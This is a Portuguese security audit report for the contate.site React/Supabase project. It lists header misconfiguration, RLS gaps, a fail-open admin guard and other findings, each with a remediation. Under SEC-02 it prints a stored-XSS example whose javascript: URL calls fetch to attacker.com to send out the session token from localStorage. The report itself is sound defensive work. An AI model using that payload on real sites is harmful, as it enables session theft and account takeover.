# 🔐 Relatório de Auditoria de Segurança — contate.site

**Data da análise:** 10 de setembro de 2026  
**Analista:** Antigravity Security Auditor (OWASP Top 10 & DevSecOps Workflow)  
**Repositório:** `github.com/IsmaelThrash/contate.site`  
**Escopo:** Frontend React 18 + Vite (`apps/web`), Supabase (Auth PKCE, PostgreSQL RLS & Triggers, PostgREST API), Servidor de Produção Hostinger (LiteSpeed Web Server, `.htaccess`), CI/CD GitHub Actions FTPS, e dependências npm.  
**Método:** Análise estática de código (SAST), verificação dinâmica de headers em produção via HTTP (`curl -I`), inspeção de constraints de banco, análise de vetores de injeção (XSS/CSS), avaliação de controle de acesso (BAC/IDOR) e auditoria de vulnerabilidades em dependências (`npm audit`).

---

## 1. Resumo Executivo & Score de Segurança

Após as correções aplicadas no ciclo de agosto de 2026 (mitigação de mass assignment `is_admin` via trigger `guard_usuario_columns`, correção do IDOR em `claim_slug`, atualização do `dompurify` para 3.4.13 e deploy criptografado via FTPS), o projeto avançou significativamente.

Contudo, esta nova auditoria identificou **uma falha confirmada em tempo real em produção** e **vetores de injeção e controle de acesso ainda pendentes**:

1. **Headers de segurança 100% INATIVOS em produção (Confirmado via teste HTTP direto):** O servidor LiteSpeed da Hostinger ignora o arquivo `_headers`. O arquivo `.htaccess` publicado contém unicamente regras de rewrite da SPA. Em produção, **NÃO há HSTS, NÃO há CSP, NÃO há X-Frame-Options (Clickjacking) e NÃO há X-Content-Type-Options**.
2. **Vetor de XSS Armazenado em `blocos_links.url`:** O frontend valida URLs ao submeter via `LinkForm.jsx`, mas a tabela do Postgres `blocos_links` **não possui constraint de protocolo**. Um usuário pode inserir `javascript:...` diretamente via PostgREST. Como `ProfilePage.jsx` renderiza `<a href={link.url}>` diretamente e não há CSP em produção, qualquer clique executa código malicioso no domínio `contate.site`, permitindo roubo de JWTs armazenados no `localStorage`.
3. **Falha de Fail-Open na Proteção de Rota Admin (`ProtectedRoute.jsx`):** Se a RPC `is_admin` falhar ou houver timeout de rede, o guard assume o valor de `currentUser.is_admin` do estado do cliente em vez de bloquear o acesso por padrão (princípio do menor privilégio / fail-secure).
4. **Exposição de Links Inativos/Rascunho a Qualquer Anônimo:** A política RLS `blocos_links_select_public` usa `USING (true)`, permitindo que qualquer pessoa leia links ocultos (`ativo = false`) de qualquer usuário.

### 📊 Score de Segurança Atual: **6.8 / 10** ⚠️

| # | ID | Vulnerabilidade / Achado | Severidade | Status |
|---|---|---|---|---|
| 1 | **SEC-01** | Headers de segurança inativos no LiteSpeed/Hostinger (Sem HSTS, CSP, XFO, nosniff) | 🟠 **ALTO** | **Confirmado em Produção** |
| 2 | **SEC-02** | XSS Armazenado em `blocos_links.url` (Falta validação no banco + sink em `<a href>`) | 🟠 **ALTO** | **Vulnerável** |
| 3 | **SEC-03** | Fail-Open no Guard de Rota Admin (`ProtectedRoute.jsx`) | 🟡 **MÉDIO** | **Vulnerável** |
| 4 | **SEC-04** | Exposição irrestrita de links inativos/ocultos (`blocos_links_select_public`) | 🟡 **MÉDIO** | **Vulnerável** |
| 5 | **SEC-05** | Operações de remoção de links bloqueadas para administradores via RLS | 🟡 **MÉDIO** | **Falha Operacional** |
| 6 | **SEC-06** | Poluição de Propriedades de Objeto / DoS no Registro VIP (`vips/registry.jsx`) | 🟡 **MÉDIO** | **Vulnerável** |
| 7 | **SEC-07** | Divergência de Slugs Reservados (`termos`, `privacidade`, `onboarding`) | 🔵 **BAIXO** | **Vulnerável** |
| 8 | **SEC-08** | Falta de validação de formato no campo `avatar` | 🔵 **BAIXO** | **Melhoria** |
| 9 | **SEC-09** | Vulnerabilidades em dependências de build (`shell-quote`, `lodash`, `browserslist`) | 🔵 **BAIXO** | **Toolchain/Dev** |

---

## 2. Detalhamento das Vulnerabilidades

### 🟠 SEC-01 — Headers de Segurança Inativos em Produção (LiteSpeed / Hostinger)

- **Gravidade:** ALTO (CVSS: 7.4)
- **Localização:** `apps/web/public/.htaccess`, `.htaccess`, `_headers`
- **Evidência Real (HTTP Response ao vivo em 10/09/2026):**
  ```http
  HTTP/1.1 200 OK
  Server: LiteSpeed
  platform: hostinger
  Content-Security-Policy: upgrade-insecure-requests
  ```
- **Diagnóstico:** O arquivo `_headers` é um padrão exclusivo de plataformas Jamstack como Netlify e Cloudflare Pages. O LiteSpeed/Apache da Hostinger utiliza exclusivamente o `.htaccess`. Como o `.htaccess` implantado no servidor tem apenas regras de rewrite, o site em produção opera **sem**:
  - `Strict-Transport-Security` (HSTS): vulnerável a SSL stripping.
  - `X-Frame-Options: SAMEORIGIN`: vulnerável a ataques de Clickjacking (o site pode ser embutido em iframes maliciosos transparentes).
  - `X-Content-Type-Options: nosniff`: vulnerável a ataques de MIME confusion.
  - `Content-Security-Policy` completa: scripts e requisições não são contidos.
  - `Referrer-Policy: strict-origin-when-cross-origin`: vazamento de caminhos em cabeçalho Referer.
  - `Permissions-Policy`: acesso irrestrito a APIs de hardware pelo navegador.
- **Remediação:** Injetar as diretivas dentro de `<IfModule mod_headers.c>` no `apps/web/public/.htaccess` e `.htaccess` raiz.

---

### 🟠 SEC-02 — XSS Armazenado em `blocos_links.url` (Falta de Constraint no Banco + Sink no React)

- **Gravidade:** ALTO (CVSS: 7.2)
- **Localização:** `apps/web/src/pages/ProfilePage.jsx:256`, `apps/web/src/components/SortableLink.jsx:45`
- **Diagnóstico:** No React, atribuir uma URL não sanitizada a um elemento `<a href={url}>` cria um sink de execução de script quando o esquema é `javascript:`.
  Embora o modal de criação (`LinkForm.jsx`) faça validação client-side via `isUrlSegura`, qualquer usuário autenticado pode emitir um `POST` direto para a API Supabase:
  ```json
  POST /rest/v1/blocos_links
  {
    "usuario_id": "<ID_DO_ATACANTE>",
    "tipo": "link",
    "titulo": "Meu Portfólio",
    "url": "javascript:fetch('https://attacker.com/steal?t='+localStorage.getItem('sb-jxdupvgluypllzfupung-auth-token'))",
    "ordem": 1,
    "ativo": true
  }
  ```
  O banco de dados não rejeita o valor porque não possui `CHECK constraint` no campo `url`. Quando qualquer visitante ou administrador clica no link no perfil do atacante, o payload XSS é executado no contexto de `contate.site`, extraindo o JWT de sessão do `localStorage`.
- **Remediação:**
  1. Frontend: Sanitizar a URL antes de renderizar em `href`, forçando fallback `#` se não iniciar com `http://` ou `https://`.
  2. Banco de Dados: Adicionar `CHECK (url ~* '^https?://[^\s]+$')` na tabela `blocos_links`.

---

### 🟡 SEC-03 — Fail-Open no Guard de Rota Admin (`ProtectedRoute.jsx`)

- **Gravidade:** MÉDIO (CVSS: 5.3)
- **Localização:** `apps/web/src/components/ProtectedRoute.jsx:20-32`
- **Código Vulnerável:**
  ```javascript
  if (!error && typeof data === 'boolean') {
    setIsAdminValid(data);
  } else {
    setIsAdminValid(!!currentUser.is_admin); // ⚠️ FALLBACK INSEGURO
  }
  // e no catch:
  .catch(() => {
    setIsAdminValid(!!currentUser.is_admin); // ⚠️ FALLBACK INSEGURO
  });
  ```
- **Diagnóstico:** Caso a RPC `is_admin` sofra timeout, erro transitório de rede ou falha de conexão com o Supabase, o componente assume como válido o atributo `currentUser.is_admin` em memória local do cliente. Em arquitetura defensiva, sistemas de controle de acesso devem adotar o princípio de **falha segura (Fail-Closed)**: qualquer erro na validação de permissão de admin deve forçar `setIsAdminValid(false)`.
- **Remediação:** Substituir o fallback por `setIsAdminValid(false)` tanto no bloco de erro quanto no `.catch()`.

---

### 🟡 SEC-04 — Exposição de Links Inativos/Ocultos via RLS (`blocos_links_select_public`)

- **Gravidade:** MÉDIO (CVSS: 4.8)
- **Localização:** `supabase_migration_rls.sql:46-48`
- **Diagnóstico:**
  ```sql
  CREATE POLICY "blocos_links_select_public" ON blocos_links
    FOR SELECT USING (true);
  ```
  A política RLS concede leitura irrestrita para qualquer usuário anônimo ou autenticado. Isso significa que se um usuário desativou temporariamente um link confidencial, link de teste ou rascunho (`ativo = false`), qualquer pessoa pode ler esses links através de:
  `GET /rest/v1/blocos_links?usuario_id=eq.<ID>&ativo=eq.false`
- **Remediação:** Restringir a policy pública para permitir leitura apenas de `ativo = true`, ou permitir leitura completa apenas se o chamador for o dono (`auth.uid() = usuario_id`) ou admin (`public.is_admin()`).

---

### 🟡 SEC-05 — Operações Administrativas Bloqueadas para Links via RLS

- **Gravidade:** MÉDIO (Falha de Operação e Moderação)
- **Localização:** `AdminPage.jsx:174-177`, `supabase_migration_admin.sql`
- **Diagnóstico:** Em `AdminPage.jsx`, ao excluir um perfil de usuário, o frontend executa primeiro:
  ```javascript
  await supabase.from('blocos_links').delete().eq('usuario_id', userToDelete.id);
  ```
  Contudo, a policy de deleção de `blocos_links` definida em `supabase_migration_rls.sql` é estritamente:
  `USING (auth.uid() = usuario_id);`
  Ela **NÃO** possui `OR public.is_admin()`. Como resultado, a chamada do admin deleta 0 linhas. Se houver integridade referencial sem cascade configurado, a exclusão da conta falha. Além disso, admins não conseguem remover links maliciosos de contas infratoras sem suspender todo o usuário.
- **Remediação:** Adicionar `OR public.is_admin()` nas policies de UPDATE e DELETE de `blocos_links`.

---

### 🟡 SEC-06 — Poluição de Propriedades de Objeto / DoS no Registro VIP (`vips/registry.jsx`)

- **Gravidade:** MÉDIO (CVSS: 5.0)
- **Localização:** `apps/web/src/vips/registry.jsx:11-13`
- **Código Vulnerável:**
  ```javascript
  export const isVip = (slug) => {
    return !!vipRegistry[slug];
  };
  ```
- **Diagnóstico:** Se um visitante acessar rotas que coincidem com propriedades padrão do protótipo JavaScript (como `contate.site/toString`, `contate.site/valueOf`, `contate.site/constructor`), `vipRegistry[slug]` retorna uma função de protótipo (`Object.prototype.toString`). A função `renderVip` tenta renderizar essa função como um componente React (`<VipComponent />`), disparando um erro fatal não capturado no React e quebrando a página (White Screen of Death).
- **Remediação:** Utilizar `Object.prototype.hasOwnProperty.call(vipRegistry, slug)` ou `Object.hasOwn(vipRegistry, slug)`.

---

### 🔵 SEC-07 — Divergência de Slugs Reservados (`termos`, `privacidade`, `onboarding`)

- **Gravidade:** BAIXO
- **Localização:** `apps/web/src/lib/constants.js:2-36`, `supabase_migration_slug_constraint.sql:18-26`
- **Diagnóstico:** As páginas `/termos`, `/privacidade` e `/onboarding` foram adicionadas nas rotas do React (`App.jsx`), mas esses termos em português não constam na lista `RESERVED_SLUGS` do frontend nem na constraint `slug_format_check` do banco. Um usuário que registre o link `@termos` ou `@privacidade` terá sua página pública inacessível (sequestro de rota interna da SPA).
- **Remediação:** Incluir `termos`, `privacidade`, `onboarding`, `planos`, `favicon.ico`, `robots.txt`, `sitemap.xml` tanto em `constants.js` quanto na constraint SQL do banco.

---

### 🔵 SEC-08 — Falta de Validação de Formato no Campo `avatar`

- **Gravidade:** BAIXO
- **Localização:** `apps/web/src/contexts/AuthContext.jsx:173-185`, `apps/web/src/pages/ProfilePage.jsx:200`
- **Diagnóstico:** `updateProfile` aceita a string `avatar` sem verificar formato. Se for injetada uma sequência com path traversal ou caracteres especiais, pode quebrar URLs do Storage (`/storage/v1/object/public/avatars/${user.id}/${user.avatar}`).
- **Remediação:** Validar `avatar` via regex estrita (ex: `^[a-zA-Z0-9_-]+\.(jpg|jpeg|png|webp)$`).

---

### 🔵 SEC-09 — Vulnerabilidades em Dependências de Toolchain / Build

- **Gravidade:** BAIXO (Não afeta o bundle de produção)
- **Evidência (`npm audit`):**
  - Raiz: `shell-quote <=1.8.4` (Critical - GHSA-w7jw-789q-3m8p em dependência de dev `concurrently`), `lodash <=4.17.23` (High).
  - `apps/web`: `browserslist <=4.28.6` (High), `js-yaml` (High).
- **Diagnóstico:** Afetam apenas scripts executados localmente e no CI; nenhuma dessas bibliotecas é empacotada no bundle final do cliente entregue aos usuários.
- **Remediação:** Executar `npm audit fix` no repositório raiz e em `apps/web`.

---

## 3. Matriz de Conformidade OWASP Top 10 (2021)

| Categoria OWASP | Status | Detalhes |
|---|---|---|
| **A01: Broken Access Control** | 🟡 **Parcialmente Mitigado** | Mass assignment e IDOR de slug resolvidos; pendente fail-closed em `ProtectedRoute` (SEC-03) e RLS de links inativos (SEC-04). |
| **A02: Cryptographic Failures** | 🟢 **Conforme** | HTTPS forçado, fluxo PKCE, sem credenciais expostas no cliente. |
| **A03: Injection** | 🟡 **Atenção** | DOMPurify ativo e cores validadas, mas `blocos_links.url` requer validação estrita de protocolo no banco e no `<a href>` (SEC-02). |
| **A04: Insecure Design** | 🟢 **Conforme** | Cooldown de 30 dias com cofre anti-acumulador de slugs, rate limits da infraestrutura. |
| **A05: Security Misconfiguration** | 🔴 **Não Conforme** | Headers de segurança completamente ausentes no servidor Hostinger (SEC-01). |
| **A06: Vulnerable and Outdated Components** | 🟢 **Conforme em Produção** | `dompurify` atualizado para 3.4.13; 0 vulnerabilidades em dependências de produção. |
| **A07: Identification and Authentication Failures** | 🟢 **Conforme** | PKCE ativado, tratamento silencioso preservado, unificação de contas mantida. |
| **A08: Software and Data Integrity Failures** | 🟢 **Conforme** | Lockfiles com integridade SHA-512, deploy via FTPS criptografado. |
| **A09: Security Logging and Monitoring Failures** | 🟢 **Conforme** | Tabela `admin_audit_log` e triggers de auditoria criados para monitoramento. |
| **A10: Server-Side Request Forgery (SSRF)** | 🟢 **N/A** | Frontend puramente estático sem relays de fetch de rede privada no backend. |

---

## 4. Plano de Ação & Remediações Recomendadas

### Prioridade P0 (Imediata)
1. **Ativar Headers de Segurança no `.htaccess` (SEC-01):** Adicionar bloco `<IfModule mod_headers.c>` no `.htaccess` de `apps/web/public` e raiz.
2. **Mitigação de XSS em Links no Frontend (SEC-02):** Proteger `<a href={link.url}>` em `ProfilePage.jsx` e `SortableLink.jsx` com filtro estrito de protocolo `https?:`.
3. **Corrigir Fail-Open do Guard Admin (SEC-03):** Definir `setIsAdminValid(false)` em caso de qualquer falha na RPC em `ProtectedRoute.jsx`.

### Prioridade P1 (Neste Ciclo)
4. **Proteção de Slugs Internos (SEC-06 & SEC-07):**
   - Corrigir checagem `Object.hasOwn` em `vips/registry.jsx`.
   - Adicionar `termos`, `privacidade`, `onboarding` em `constants.js` e na migration do banco.
5. **Atualizar Migration de Segurança SQL (SEC-02, SEC-04, SEC-05):**
   - Adicionar constraint `CHECK (url ~* '^https?://[^\s]+$')` em `blocos_links`.
   - Atualizar RLS de `blocos_links` para proteger links inativos e conceder privilégios de moderação a admins.
6. **Validação de formato no campo `avatar` (SEC-08):** Inserir regex de whitelist no `AuthContext.jsx`.

### Prioridade P2 (Manutenção e Toolchain)
7. Executar `npm audit fix` para atualizar bibliotecas de build/CI (SEC-09).
